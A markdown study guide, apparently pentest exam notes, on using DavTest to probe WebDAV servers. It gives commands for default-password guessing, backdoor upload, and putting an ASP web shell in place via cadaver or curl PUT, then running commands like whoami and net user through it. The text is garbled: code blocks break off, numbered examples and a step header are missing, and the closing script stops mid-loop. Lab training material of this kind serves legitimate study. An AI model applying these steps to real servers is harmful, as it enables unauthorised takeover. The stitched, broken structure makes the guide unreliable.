# 🔧 DavTest - WebDAV Vulnerability Scanner

**A simple tool to test WebDAV servers for file upload weaknesses and security issues**

**📍 File Location:** `06-vulnerability-assessment/davtest-webdav-scanner.md`

---

## 🎯 What is DavTest?

DavTest is a security testing tool that checks **WebDAV servers** for vulnerabilities. WebDAV lets users upload and manage files on web servers. DavTest helps find if you can upload dangerous files like web shells.

### 🔍 **What DavTest Does:**
- Tests if you can upload files to WebDAV servers
- Checks different file types (.php, .asp, .html, etc.)
- Tests if uploaded files can run on the server
- Checks login requirements and weak passwords
- Creates test folders and cleans up after testing

### 💡 **Why This Matters for eJPT:**
Many web servers have WebDAV enabled but with weak security. If you can upload and run script files, you can get a web shell and control the server.

---

## 📦 Installation and Setup

### **Already Installed On:**
- ✅ Kali Linux
- ✅ Parrot Security OS
- ✅ Most penetration testing systems

### **Check If Installed:**
```bash
# Check if davtest is available

**🎯 What This Means for eJPT Exam:**

**✅ ALL FILES CAN BE UPLOADED:**
- This is bad security - the server accepts any file type

**⚡ DANGEROUS FILES THAT CAN RUN:**
- **`.asp` files** → **CRITICAL DANGER** → You can upload web shells
- **`.html` files** → **MEDIUM DANGER** → You can do XSS attacks

**🚫 FILES THAT CAN'T RUN:**
- PHP, JSP, Perl scripts → Server doesn't support these languages

**💡 How to Exploit This:**
1. Upload an ASP web shell using cadaver
2. Visit the shell in browser: `http://demo.ine.local/webdav/shell.asp`
3. Run system commands to take control

---

### **Example 3: Testing With Automatic Backdoors**
```bash
# Advanced command that uploads backdoor files
davtest -sendbd auto -auth bob:password_123321 -directory exploit -url http://demo.ine.local/webdav

# This will:
# 1. Make a folder called 'exploit'
# 2. Upload different backdoor files
# 3. Test which ones can run
# 4. Tell you which backdoors work
```

---

### **Example 4: Clean Professional Testing**
```bash
# Good practice - test and clean up
davtest -auth bob:password_123321 -directory pentest_$(date +%s) -cleanup -url http://demo.ine.local/webdav

# Benefits:
# - Makes unique folder with timestamp
# - Does complete testing
# - Removes all test files automatically
# - Leaves no traces
```

```

### **🎯 Common eJPT Exam Scenarios:**

#### **Scenario 1: Find WebDAV on Unknown Server**
**Given:** Web server on port 80, you don't know if WebDAV exists
**Your Job:** Find WebDAV and test what it can do

**How to Approach:**
```bash
# Step 1: Scan for services first
nmap -sV -p 80 --script http-enum target_ip

# Step 2: Test common WebDAV locations
davtest -url http://target_ip/webdav
davtest -url http://target_ip/
davtest -url http://target_ip/dav

# Step 3: Write down what you find and test login
```

#### **Scenario 2: Test File Upload Security**
**Given:** WebDAV server with username and password
**Your Job:** Find out what files you can upload and run

**How to Approach:**
```bash
# Complete security test
davtest -auth given_username:given_password -url http://target/webdav

# Document your findings:
# - What files can be uploaded: [list them]
# - What files can run: [list them]
# - How dangerous this is: [HIGH/MEDIUM/LOW]
```

#### **Scenario 3: Upload Web Shell**
**Given:** DavTest shows ASP files can run
**Your Job:** Upload a web shell to control the server

**Step by Step:**
```bash
# 1. Confirm with davtest
davtest -auth creds -url http://target/webdav

# 2. Upload shell using cadaver (different tool)
cadaver http://target/webdav
put /usr/share/webshells/asp/cmd.asp

# 3. Test the shell in browser
# Go to: http://target/webdav/cmd.asp?cmd=whoami
```

### **📝 eJPT Exam Tips:**

#### **⏰ Time Management:**
- **2-3 minutes:** Quick test without password
- **5-7 minutes:** Full test with password if you have one
- **1-2 minutes:** Write down results and plan next step

#### **🎯 Mistakes to Avoid:**
1. **Skipping the no-password test** → Always check if login is needed
2. **Only testing /webdav path** → Try /, /dav, /webdav paths
3. **Ignoring realm information** → Use realm info to guess passwords
4. **Not writing down which files can run** → This is critical for exploitation

#### **✅ Signs You're Doing Well:**
- You find WebDAV servers quickly
- You determine if passwords are needed
- You correctly list uploadable file types
- You identify which files can execute
- You plan good exploitation steps

### **🔍 Typical Exam Questions:**
1. **"What file types can you upload to this WebDAV server?"**
   - Look at the PUT results from davtest

2. **"What login method does the WebDAV server use?"**
   - Look for "Basic realm" or other authentication info

3. **"Which uploaded files can execute on the server?"**
   - Check the EXEC results from davtest

```bash
# Find web services and WebDAV
nmap -sV -p 80,8080,443,8443 --script http-enum,http-methods target_ip

# Look for these clues:
# - "WebDAV" mentioned in service info
# - HTTP methods like PUT, PROPFIND, MKCOL
# - Directories like /webdav in results
```

#### **Step 2: Assessment (Use DavTest)**
```bash
# Test the WebDAV paths you found
davtest -url http://target_ip/found_webdav_path

# If password needed, try common ones
davtest -auth admin:admin -url http://target_ip/webdav
davtest -auth guest:guest -url http://target_ip/webdav

# Full test when you have good credentials
davtest -auth working_creds -url http://target_ip/webdav
```

#### **Step 3: Exploitation (Use Cadaver)**
```bash
# If davtest shows ASP files can run, upload a web shell
cadaver http://target_ip/webdav
# Then interactively upload your shell files

# Or use curl for direct upload
curl -X PUT --data-binary @webshell.asp http://username:password@target/webdav/shell.asp
```

#### **Step 4: Control (Use Browser)**
```bash
# Access your uploaded shell
firefox http://target_ip/webdav/shell.asp?cmd=whoami

# Run commands through the web shell
# URL: http://target/webdav/shell.asp?cmd=dir+C:\
# URL: http://target/webdav/shell.asp?cmd=net+user
```

### **🔧 Using DavTest With Burp Suite**
```bash
# Set up proxy to see all HTTP traffic
export http_proxy=http://127.0.0.1:8080
davtest -auth creds -url http://target/webdav

# Benefits:
# - See exactly what HTTP requests are sent
# - Manually verify how uploads work
# - Test authentication in detail
# - Modify payloads manually
```

### **⚙️ Automation Script Example:**
```bash
#!/bin/bash
# Simple WebDAV testing script

TARGET=$1
echo "[+] Testing WebDAV on $TARGET"

# Test common paths
for path in "" "webdav" "dav" "_vti_bin"; do
    echo "[+] Testing /$path"
    davtest -url http://$TARGET/$path 2>/dev/null | grep -q "SUCCEED" && echo "Found WebDAV at /$path"
